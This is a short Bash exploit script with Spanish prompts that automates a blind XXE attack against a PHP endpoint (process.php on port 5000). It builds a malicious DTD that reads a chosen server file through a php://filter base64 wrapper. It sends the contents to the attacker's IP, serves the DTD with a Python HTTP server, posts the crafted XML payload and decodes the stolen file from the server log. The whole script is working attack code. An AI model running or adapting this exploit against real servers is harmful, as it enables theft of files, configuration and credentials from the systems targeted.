#!/bin/bash                                                                                                                                                                                                                                 

echo -ne "\n[+] Introduce el archivo a leer: " && read -r miarchivo

echo -ne "\n[+] Introduce tu ip: " && read -r miip

echo -ne "\n[+] Introduce la ip de la Web: " && read -r ipweb

malicious_dtd="""                                                                                                                                                                                                                           
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$miarchivo\">                                                                                                                                                          
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://$miip/?file=%file;'>\">                                                                                                                                                              
%eval;                                                                                                                                                                                                                                      
%exfil;"""

echo $malicious_dtd > malicious.dtd

python3 -m http.server 80 &>respuesta &

PID=$!

sleep 3; echo


curl -s -X POST "http://$ipweb:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % archivo SYSTEM "http://'"$miip"'/malicious.dtd">%archivo;]><root><name>Juan</name><tel>6666666666</tel><email>test@tes\
t.com;</email><password>juan123</password></root>'

echo

cat respuesta | grep -oP "/?file=\K[^-*\s]+" | base64 -d

kill -9 $PID

wait $PID 2>/dev/null
